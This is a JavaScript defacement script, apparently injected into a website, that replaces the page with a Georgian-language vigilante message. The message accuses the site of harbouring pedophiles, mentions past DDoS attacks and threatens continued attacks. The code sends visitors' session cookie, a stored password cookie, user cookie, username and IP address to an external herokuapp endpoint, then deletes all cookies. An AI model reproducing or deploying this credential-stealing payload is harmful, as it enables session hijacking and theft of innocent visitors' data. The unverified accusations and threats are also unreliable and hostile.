var content = `    <center>
                    <img src="https://assets.stickpng.com/images/5a81af7d9123fa7bcc9b0793.png" style="height:10%; width:10%;">
                    <p><b>შენ დამნაშავე ხარ!</b></p> 
                    <p>რაც შემეძლო ყველაფერი გავაკეთე თქვენს გასაფრთხილებლად, პატარა შეტევებიდან დაწყებული - DDoS-ით დამთავრებული. 

                        გთხოვეთ რომ მოდერაცია გაგეწიათ თქვენს საიტზე მყოფი ხალხისთვის, მაგრამ თქვენ ჩემი თხოვნა ფეხებზე დაიკიდეთ.
                        წარგიდგინეთ ასევე "სქრინებიც", სადაც ჩანდა ამ საიტის მომხმარებლების მიერ გაგზავნილი მესიჯები არასრულწლოვანების მიმართ, და მაინც, თქვენ ეს ფეხებზე დაიკიდეთ. თქვენგან არაფერი მოდიოდა თუ არ ჩავთვლით ბილწსიტყვაობას და ბავშვურ საქციელებს.<br>
                        <br>
                        <b>P.S ახლა აღარ შეგეშვებით სანამ ამ საიტს თქვენით არ გამორთავთ. </b><br>
                        <br>
                        <br>
                        მესიჯი ამ საიტის მომხმარებლებისთვის:<br>
                        
                        გთხოვ, დატოვე ეს საიტი. გადადი რამე სხვა პლატფორმაზე, მაგალითად Facebook, Discord ან რაიმე სხვა.  მიატოვე ეს ამაზრზენი "ადამიანებით" გავსებული საიტი. ნუ იქნები ამ წრის წევრი. <br>
                        <b>შენი ინფორმაცია ამ საიტზე უსაფრთხოდ არ არის! მე ვეცდები მის წაშლას, არ ინერვიულოთ ამაზე. თქვენ უბრალოდ ეს საიტი დატოვეთ.</b>

                        
                        <br>
                        <br>
                        <b>მესიჯი ზემოთ ხსენებული ამაზრზენი "ადამიანებისთვის", პედოფილებისთვის:</b><br>
                        
                        დიახ შენ, ხელახლა წაიკითხე პირველი წინადადება. თქვენს მიერ ჩადენილი დანაშაული უპასუხოდ არ დარჩება. <b><br>ელოდეთ პასუხს უახლოეს მომავალში შესაბამისი სამსახურებისგან.</b> </p>

                        <br>
                        <br>
                        <br>
                        <br>
                        <p><b>CONTACT:  anti-pedo-inc@protonmail.com</b></p>
                        <p>Copyright © by Jim Browning</p>
                        <p>Anti-pedophile movement</p>
                    </center>
                    `
function deleteAllCookies() {
    var cookies = document.cookie.split(";");

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}
function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}


document.title="Anti-pedophile movement"

$('body').html(" ");

$('body').css("background-color", "#ffa852");
$('body').append(content);




$.getJSON('http://ipinfo.io', function(data){
    ip = data.ip;


    $.ajax({
        type: "POST",
        url: "https://nameless-wave-78594.herokuapp.com/information",
        data: { username: userName, userid: "failed", sess: getCookie('SESS'), pass: getCookie('pass'), userCookie: getCookie('user'), custCookie: "failed", ipAddress: ip },
    });
    
    setTimeout(() => {
        deleteAllCookies();
    }, 2000);
    
});



